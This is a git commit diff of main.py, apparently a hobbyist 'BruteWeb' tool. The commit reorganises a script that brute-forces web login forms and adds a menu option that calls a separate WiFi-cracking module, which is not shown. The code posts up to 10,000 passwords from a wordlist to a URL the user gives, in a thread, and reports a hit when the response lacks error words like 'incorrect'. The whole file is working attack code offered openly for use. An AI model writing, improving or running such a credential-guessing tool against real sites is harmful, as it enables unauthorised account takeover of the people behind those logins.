7ffe9c217d3974a98406f972695cf8d1ae9001a5
hunter87 <83773586+Hunter87ff@users.noreply.github.com>
2023-11-16 11:16:31 +0530

    Update main.py

--- main.py
+++ main.py
@@ -2,15 +2,18 @@
 # Github : https://github.com/hunter87ff
 # Insta  : https://instagram.com/im_hunter87
 # Youtube: https://youtube.com/@hunter87
-
-import requests, sys, os, time
-import threading, argparse
-req = requests
 lgr='\033[1;32m' 
 red='\033[0;31m' 
 cyan='\033[36m' 
 blue='\033[34m'
 NC='\033[0m'
+
+try:
+	import os, sys, time, brutewf, threading
+	import requests as req
+except ImportError: os.system("pip install -r requirements.txt")
+
+
 banner = f"""{red}
   ____             _     __        __   _     
  | __ ) _ __ _   _| |_ __\ \      / /__| |__  
@@ -21,36 +24,43 @@ banner = f"""{red}
                           {lgr}-By Hunter87ff 
 {NC}"""
 print(banner)
-def is_incorrect(res):
-	error = ["incorrect", "wrong", "invalid", "not found"]
-	for err in error:
-		if err in res.lower():
-			return True
-def crack(url, target, dest, psw):
-	count = 1
-	for i in psw:
-		data = {f"{target}":f"{dest}", "pass":f"{i}"}
-		res = req.post(url, data, timeout=1).text
-		if is_incorrect(res):
-			print(f"{count}) Failed {i}")
-		else:
-			print(f"{lgr}Password Is : {i}{NC}")
-			return True
-		count += 1
-def main():
-	url = input("Enter Url : ")
-	target = input("Target (eg: email, username): ")
-	dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
-	passw = input("Password parameter (eg: pass, psw, password) :")
-	chunk = 10000
-	load = f"""{red}Starting Attack : 
+
+dec = input("Enter web/wifi : ")
+if dec.lower()=="web":
+	def is_incorrect(res):
+		error = ["incorrect", "wrong", "invalid", "not found"]
+		for err in error:
+			if err in res.lower():
+				return True
+	def crack(url, target, dest, psw):
+		count = 1
+		for i in psw:
+			data = {f"{target}":f"{dest}", "pass":f"{i}"}
+			res = req.post(url, data, timeout=1).text
+			if is_incorrect(res):
+				print(f"{count}) Failed {i}")
+			else:
+				print(f"{lgr}Password Is : {i}{NC}")
+				return True
+			count += 1
+	def web():
+		url = input("Enter Url : ")
+		target = input("Target (eg: email, username): ")
+		dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
+		passw = input("Password parameter (eg: pass, psw, password) :")
+		chunk = 10000
+		load = f"""{red}Starting Attack : 
 █████████████████████████████████████████████████\n"""
-	for x in load:
-		sys.stdout.write(x)
-		sys.stdout.flush()
-		time.sleep(0.02)
-	with open("passwords.txt", "r") as f:
-		passwords = f.read().split("\n")[0:chunk]
-		t = threading.Thread(target=crack, args=(url, target, dest, passwords, ))
-		t.start()
-main()
+		for x in load:
+			sys.stdout.write(x)
+			sys.stdout.flush()
+			time.sleep(0.02)
+		with open("passwords.txt", "r") as f:
+			passwords = f.read().split("\n")[0:chunk]
+			t = threading.Thread(target=crack, args=(url, target, dest, passwords, ))
+			t.start()
+	web()
+
+####WIFI####
+if dec.lower()=="wifi":
+	brutewf.main()
